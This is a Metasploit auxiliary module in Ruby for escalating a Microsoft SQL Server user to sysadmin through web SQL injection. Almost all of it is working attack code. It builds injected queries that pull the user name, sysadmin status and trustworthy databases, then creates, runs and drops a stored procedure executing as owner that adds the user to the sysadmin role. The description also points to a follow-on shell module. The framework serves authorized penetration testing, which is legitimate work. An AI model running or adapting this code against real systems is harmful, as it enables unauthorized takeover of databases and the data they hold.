##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/exploit/mssql_commands'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::MSSQL_SQLI
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Microsoft SQL Server SQLi Escalate Db_Owner',
      'Description'    => %q{
        This module can be used to escalate SQL Server user privileges to sysadmin through a web
        SQL Injection. In order to escalate, the database user must to have the db_owner role in
        a trustworthy database owned by a sysadmin user. Once the database user has the sysadmin
        role, the mssql_payload_sqli module can be used to obtain a shell on the system.

        The syntax for injection URLs is: /testing.asp?id=1+and+1=[SQLi];--
      },
      'Author'         => [ 'nullbind <scott.sutherland[at]netspi.com>'],
      'License'        => MSF_LICENSE,
      'References'     => [['URL','http://technet.microsoft.com/en-us/library/ms188676(v=sql.105).aspx']]
    ))
  end

  def run
    # Get the database user name
    print_status("Grabbing the database user name from ...")
    db_user = get_username
    if db_user.nil?
      print_error("Unable to grab user name...")
      return
    else
      print_good("Database user: #{db_user}")
    end

    # Grab sysadmin status
    print_status("Checking if #{db_user} is already a sysadmin...")
    admin_status = check_sysadmin

    if admin_status.nil?
      print_error("Couldn't retrieve user status, aborting...")
      return
    elsif admin_status == '1'
      print_error("#{db_user} is already a sysadmin, no esclation needed.")
      return
    else
      print_good("#{db_user} is NOT a sysadmin, let's try to escalate privileges.")
    end

    # Check for trusted databases owned by sysadmins
    print_status("Checking for trusted databases owned by sysadmins...")
    trust_db_list = check_trust_dbs
    if trust_db_list.nil? || trust_db_list.length == 0
      print_error("No databases owned by sysadmin were found flagged as trustworthy.")
      return
    else
      # Display list of accessible databases to user
      print_good("#{trust_db_list.length} affected database(s) were found:")
      trust_db_list.each do |db|
        print_status(" - #{db}")
      end
    end

    # Check if the user has the db_owner role in any of the databases
    print_status("Checking if #{db_user} has the db_owner role in any of them...")
    owner_status = check_db_owner(trust_db_list)
    if owner_status.nil?
      print_error("Fail buckets, the user doesn't have db_owner role anywhere.")
      return
    else
      print_good("#{db_user} has the db_owner role on #{owner_status}.")
    end

    # Attempt to escalate to sysadmin
    print_status("Attempting to add #{db_user} to sysadmin role...")
    escalate_privs(owner_status, db_user)

    admin_status = check_sysadmin
    if admin_status && admin_status == '1'
      print_good("Success! #{db_user} is now a sysadmin!")
    else
      print_error("Fail buckets, something went wrong.")
    end
  end

  def get_username
    # Setup query to check for database username
    clue_start = Rex::Text.rand_text_alpha(8 + rand(4))
    clue_end = Rex::Text.rand_text_alpha(8 + rand(4))
    sql = "(select '#{clue_start}'+SYSTEM_USER+'#{clue_end}')"

    # Run query
    result = mssql_query(sql)

    # Parse result
    if result && result.body && result.body =~ /#{clue_start}([^>]*)#{clue_end}/
      user_name = $1
    else
      user_name = nil
    end

    user_name
  end

  def check_sysadmin
    # Setup query to check for sysadmin
    clue_start = Rex::Text.rand_text_alpha(8 + rand(4))
    clue_end = Rex::Text.rand_text_alpha(8 + rand(4))
    sql = "(select '#{clue_start}'+cast((select is_srvrolemember('sysadmin'))as varchar)+'#{clue_end}')"

    # Run query
    result = mssql_query(sql)

    # Parse result
    if result && result.body && result.body =~ /#{clue_start}([^>]*)#{clue_end}/
      status = $1
    else
      status = nil
    end

    status
  end

  def check_trust_dbs
    # Setup query to check for trusted databases owned by sysadmins
    clue_start = Rex::Text.rand_text_alpha(8 + rand(4))
    clue_end = Rex::Text.rand_text_alpha(8 + rand(4))
    sql = "(select cast((SELECT '#{clue_start}'+d.name+'#{clue_end}' as DbName
      FROM sys.server_principals r
      INNER JOIN sys.server_role_members m ON r.principal_id = m.role_principal_id
      INNER JOIN sys.server_principals p ON
      p.principal_id = m.member_principal_id
      inner join sys.databases d on suser_sname(d.owner_sid) = p.name
      WHERE is_trustworthy_on = 1 AND d.name NOT IN ('MSDB') and r.type = 'R' and r.name = N'sysadmin' for xml path('')) as int))"

    # Run query
    res = mssql_query(sql)

    unless res && res.body
      return nil
    end

    # Parse results
    parsed_result = res.body.scan(/#{clue_start}(.*?)#{clue_end}/m)

    if parsed_result && !parsed_result.empty?
      parsed_result.flatten!
      parsed_result.uniq!
    end

    print_status("#{parsed_result.inspect}")

    parsed_result
  end

  def check_db_owner(trust_db_list)
    # Check if the user has the db_owner role is any databases
    trust_db_list.each do |db|
      # Setup query
      clue_start = Rex::Text.rand_text_alpha(8 + rand(4))
      clue_end = Rex::Text.rand_text_alpha(8 + rand(4))
      sql = "(select '#{clue_start}'+'#{db}'+'#{clue_end}' as DbName
        from [#{db}].sys.database_role_members drm
        join [#{db}].sys.database_principals rp on (drm.role_principal_id = rp.principal_id)
        join [#{db}].sys.database_principals mp on (drm.member_principal_id = mp.principal_id)
        where rp.name = 'db_owner' and mp.name = SYSTEM_USER for xml path(''))"

      # Run query
      result = mssql_query(sql)

      unless result && result.body
        next
      end

      # Parse result
      if result.body =~ /#{clue_start}([^>]*)#{clue_end}/
        return $1
      end
    end

    nil
  end

  # Attempt to escalate privileges
  def escalate_privs(dbowner_db,db_user)
    # Create the evil stored procedure WITH EXECUTE AS OWNER
    evil_sql_create = "1;use #{dbowner_db};
      DECLARE @myevil as varchar(max)
      set @myevil = '
      CREATE PROCEDURE sp_elevate_me
      WITH EXECUTE AS OWNER
      as
      begin
      EXEC sp_addsrvrolemember ''#{db_user}'',''sysadmin''
      end';
      exec(@myevil);--"
    mssql_query(evil_sql_create)

    # Run the evil stored procedure
    evilsql_run = "1;use #{dbowner_db};
      DECLARE @myevil2 as varchar(max)
      set @myevil2 = 'EXEC sp_elevate_me'
      exec(@myevil2);--"
    mssql_query(evilsql_run)

    # Remove evil procedure
    evilsql_remove = "1;use #{dbowner_db};
      DECLARE @myevil3 as varchar(max)
      set @myevil3 = 'DROP PROCEDURE sp_elevate_me'
      exec(@myevil3);--"
    mssql_query(evilsql_remove)
  end
end
